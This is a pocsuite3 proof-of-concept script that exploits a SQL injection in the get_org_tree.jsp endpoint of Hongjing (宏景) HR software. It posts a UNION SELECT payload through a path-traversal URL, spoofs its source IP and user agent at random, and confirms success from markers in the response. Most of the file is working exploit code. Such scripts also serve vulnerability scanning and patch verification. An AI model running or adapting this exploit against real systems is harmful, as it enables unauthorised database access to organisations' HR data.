#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    references = []
    name = '宏景人力app_check_in-get_org_tree-sql注入'
    appPowerLink = ''
    appName = '宏景'
    appVersion = '宏景'
    vulType = 'Other'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': tools.get_random_ip()
        }
        data = "params=1=0 union select 1,@@version,'hjsoft',4--+"
        res = requests.post(url=f"{self.url}/templates/attestation/../../kq/app_check_in/get_org_tree.jsp", data=data, headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return 'title="hjsoft"' in res.text and "<TreeNode id=" in res.text and 'target="mil_body"' in res.text and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    'URL': self.url,
                    '存在 宏景人力app_check_in-get_org_tree-sql注入': self.url
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
